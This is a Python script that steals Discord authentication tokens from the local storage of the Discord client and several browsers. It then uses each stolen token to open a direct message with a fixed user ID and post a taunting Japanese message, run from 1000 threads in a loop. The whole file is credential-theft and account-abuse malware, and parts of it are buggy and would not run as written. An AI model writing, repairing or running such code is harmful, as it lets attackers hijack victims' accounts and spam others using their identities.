import os
import requests
import threading








def tokenget(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)





local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
def dmspam():
 while True:
  paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
  }
  tokenget(paths)
  for token in tokens:
    header = {
      "authorization": token,
      "content-type": "application/json"
    }
    data = {
      "recipients": "977122894717001738"
    }
    r = requests.post("https://discord.com/api/v9/users/@me/channels",headers=header,data=data).json
    data = {
      "content": "荒らしが荒らされてて草"
    }
    requests.post("https://discord.com/api/v9/channels/{r.id}/messages",data=data,headers=header)

  

threads = []
for a in range(1000):
    threads.append(threading.Thread(target=dmspam))
    threads[a].start()
